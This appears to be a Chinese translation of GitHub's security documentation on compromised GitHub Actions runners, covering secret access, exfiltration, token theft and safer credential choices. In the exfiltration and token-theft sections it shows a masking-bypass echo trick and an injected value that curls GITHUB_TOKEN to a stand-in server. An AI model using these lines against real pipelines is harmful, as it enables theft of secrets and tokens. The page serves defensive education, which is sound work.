# 被入侵的运行器

了解与遭入侵的 GitHub Actions 运行器相关的安全风险。

## 受损运行器的潜在影响

这些部分考虑攻击者能够在运行程序上运行 GitHub Actions 恶意命令时可以采取的一些步骤。

> \[!NOTE]
> GitHub-托管的运行程序不会在其作业期间扫描用户下载的恶意代码，例如遭到入侵的第三方库。

### 访问密钥

使用 `pull_request` 事件从分叉的仓库触发的工作流具有只读权限，不能访问机密。 但是，这些权限因各种事件触发因素（如 `issue_comment`、`issues`、`push` 和 `pull_request`）与仓库内的分支不同，攻击者可能试图窃取仓库机密或使用作业的 [`GITHUB_TOKEN`](/zh/actions/concepts/security/github_token) 的写入权限。

* 如果机密或令牌设置为环境变量，可以使用 `printenv` 通过环境直接进行访问。

* 如果在表达式中直接使用密钥，生成的 shell 脚本将存储在磁盘上，并且可以访问。

* 对于自定义操作，风险可能因程序如何使用从参数中获取的密钥而异：

  ```yaml
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```

尽管 GitHub Actions 会从内存中清除工作流（或包含的操作）中未引用的机密，但有决心的攻击者仍然可以获取 `GITHUB_TOKEN` 以及任何被引用的机密。

### 泄露运行器中的数据

攻击者可以从运行器泄露任何被盗的密钥或其他数据。 为了帮助防止机密意外泄露，GitHub Actions[自动屏蔽输出到日志中的机密信息](/zh/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets)，但这并不是真正的安全边界，因为机密信息仍可能被有意写入日志。 例如，可使用 `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};` 来泄露经过模糊处理的机密。 此外，由于攻击者可能运行任意命令，他们可以使用 HTTP 请求将机密或其他仓库数据发送到外部服务器。

### 窃取作业的 `GITHUB_TOKEN`

攻击者有可能窃取作业的 `GITHUB_TOKEN`。 GitHub Actions 运行器自动接收生成的 `GITHUB_TOKEN`，权限仅限于包含工作流的存储库，令牌在作业完成后过期。 一旦过期，令牌对攻击者不再有用。 为解决此限制，他们可以通过调用带有令牌的攻击者控制的服务器（例如：`a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`）来自动执行攻击并在几分之一秒内完成攻击。

### 修改仓库的内容

如果分配的权限GitHub[不受限制](/zh/actions/reference/workflows-and-actions/workflow-syntax#permissions)，攻击者服务器可以使用 `GITHUB_TOKEN` API [修改存储库内容](/zh/actions/tutorials/authenticate-with-github_token#modifying-the-permissions-for-the-github_token)，包括发布。

### 跨存储库访问

GitHub Actions 被有意设计为一次仅适用于单个存储库。
`GITHUB_TOKEN` 授予与写入访问用户相同的访问权限，因为任何写入访问用户都可以通过创建或修改工作流文件来访问此令牌，在必要时提升 `GITHUB_TOKEN` 的权限。 用户对每个存储库具有特定权限，因此允许 `GITHUB_TOKEN` 一个存储库授予对另一个存储库的访问权限会影响 GitHub 权限模型（如果未仔细实现）。 同样，在向工作流添加 GitHub 身份验证令牌时必须小心，因为这也会通过无意中授予对协作者的广泛访问权限来影响 GitHub 权限模型。

如果你的组织归某个企业账户所有，则可以通过将 GitHub Actions 存储在内部仓库中来共享和复用它们。 有关详细信息，请参阅“[与企业共享操作和工作流](/zh/actions/how-tos/reuse-automations/share-with-your-enterprise)”。

可以通过在工作流中将 GitHub 身份验证令牌或 SSH 密钥作为机密引用，执行其他特权跨仓库交互操作。 由于许多身份验证令牌类型不允许对特定资源进行细致的访问，因此使用错误的令牌类型存在很大风险，因为它可以授予比预期范围更广泛的访问。

此列表描述建议用于在工作流程中访问仓库数据的方法，按优先顺序降序排列：

1. 此 `GITHUB_TOKEN`
   * 令牌有意将范围限定为调用工作流程的单个仓库，并且可拥有与仓库中拥有写权限的用户相同的访问级别。 令牌在每个作业开始之前创建，在作业完成时过期。 有关详细信息，请参阅“[在工作流中使用 GITHUB\_TOKEN 进行身份验证](/zh/actions/tutorials/authenticate-with-github_token)”。
   * 应尽可能使用 `GITHUB_TOKEN`。
2. 存储库部署密钥
   * 部署密钥是唯一授予对单个存储库的读取或写入访问权限的凭据类型之一，可用于与工作流程中的另一个仓库进行交互。 有关详细信息，请参阅“[管理部署密钥](/zh/authentication/connecting-to-github-with-ssh/managing-deploy-keys#deploy-keys)”。
   * 请注意，部署密钥只能使用 Git 克隆和推送到仓库，不能用于与 REST 或 GraphQL API 进行交互，因此它们可能不适合您的要求。
3. \*\*
   GitHub App 令牌\*\*
   * GitHub Apps 可以在选择的存储库上安装，甚至可以对它们中的资源具有精细权限。 可以在组织内部创建一个 GitHub App 内部组件，将其安装在工作流中需要访问的存储库上，并在工作流中作为安装进行身份验证以访问这些存储库。 有关详细信息，请参阅“[在GitHub Actions工作流中使用GitHub应用发出经过身份验证的 API 请求](/zh/apps/creating-github-apps/authenticating-with-a-github-app/making-authenticated-api-requests-with-a-github-app-in-a-github-actions-workflow)”。
4. \*\*
   personal access tokens\*\*
   * 不应使用 personal access token (classic). 这些令牌授予对有权访问的组织内的所有存储库以及个人帐户中的所有个人存储库的访问权限。 这间接地授予具有写入权限的用户对工作流所在仓库的广泛访问权限。
   * 如果你确实使用了 personal access token，则绝不要使用你自己帐户中的 personal access token。 如果你之后离开组织，使用此令牌的工作流将立即中断，而且调试此问题可能具有挑战性。 相反，您应为属于您的组织的新账户使用 fine-grained personal access token，并且仅向该账户授予工作流所需特定仓库的访问权限。 请注意，此方法不可扩展，应避免此方法，应该选择其他替代方案，例如部署密钥。
5. **个人帐户上的 SSH 密钥**
   * 工作流不应使用个人帐户上的 SSH 密钥。 类似于 personal access tokens (classic)，它们向所有个人存储库以及你有权通过组织成员身份访问的所有存储库授予读/写权限。 这间接地授予具有写入权限的用户对工作流所在仓库的广泛访问权限。 如果您打算使用 SSH 密钥，因为您只需要执行仓库克隆或推送，并且不需要与公共 API 交互，则应该使用单独的部署密钥。

## 后续步骤

有关 GitHub Actions 的安全最佳实践，请参阅 [安全使用指南](/zh/actions/reference/security/secure-use)。